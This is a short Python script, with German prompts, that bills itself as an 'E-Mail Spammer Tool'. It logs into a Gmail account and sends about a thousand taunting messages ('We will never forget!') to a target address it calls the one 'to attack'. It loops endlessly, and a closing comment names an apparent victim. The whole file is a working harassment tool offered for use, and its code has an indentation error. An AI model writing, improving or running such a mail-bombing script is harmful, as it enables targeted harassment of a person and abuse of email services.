from email.mime.text import MIMEText
from time import sleep
from random import randint
import smtplib
from colored import fg, attr
import os

def boot():
    print("======================================================================")
    print("|                        E-Mail Spammer Tool                         |")
    print("|                            Made by %sErum%s                            |" % (fg(1), attr(0)))
    print("======================================================================")

boot()
username = input(str("E-Mail Adresse    : "))
password = input(str("E-Mail Passwort   : "))

def cls():
    os.system('cls')

def server_start():
    server = smtplib.SMTP("smtp.gmail.com")
    server.ehlo()
    server.starttls()
    server.login(username, password)
    return server

def spamm(server):
    boot()
    emails = input(str("E-Mail zum Angreifen: "))
        for mailanz in range(1, 1000):
            print(f"=={mailanz}== wurden gesendet!")
            msg = MIMEText(
            "We will never forget!" + str(randint(1,9999))
            )
            msg["Subject"] = "Das Internet vergisst nie! " + str(randint(1, 9999))
            msg["From"] = username
            msg["To"] = emails
            server.sendmail(username, emails, msg.as_string())

def main():
    while True:
        server = server_start()
        try:
            spamm(server)
        except Exception as e:
            sleep(60)

while True:
    main()


#Mails an raini
#951
